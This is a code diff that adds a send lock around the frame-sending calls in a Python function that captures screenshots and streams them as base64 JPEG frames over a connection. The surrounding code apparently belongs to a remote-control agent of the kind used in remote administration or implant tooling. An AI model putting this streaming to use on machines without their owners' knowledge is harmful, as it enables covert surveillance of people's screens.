@@ -506,12 +506,14 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
                                        [cv2.IMWRITE_JPEG_QUALITY, quality])
                 if ok:
                     b64 = base64.b64encode(buf.tobytes()).decode()
-                    _send_msg(conn, f"FRAME:{b64}")
+                    with _send_lock:
+                        _send_msg(conn, f"FRAME:{b64}")
                 elapsed = time.monotonic() - t0
                 sleep_t = delay - elapsed
                 if sleep_t > 0:
                     time.sleep(sleep_t)
-        _send_msg(conn, "STREAM_END")
+        with _send_lock:
+            _send_msg(conn, "STREAM_END")
         return None
 
     except ImportError:
@@ -526,12 +528,14 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
                 buf = io.BytesIO()
                 img.save(buf, format="JPEG", quality=quality)
                 b64 = base64.b64encode(buf.getvalue()).decode()
-                _send_msg(conn, f"FRAME:{b64}")
+                with _send_lock:
+                    _send_msg(conn, f"FRAME:{b64}")
                 elapsed = time.monotonic() - t0
                 sleep_t = delay - elapsed
                 if sleep_t > 0:
                     time.sleep(sleep_t)
-            _send_msg(conn, "STREAM_END")
+            with _send_lock:
+                _send_msg(conn, "STREAM_END")
             return None
         except Exception as exc:
             return f"[-] screenshot_stream: {exc}"
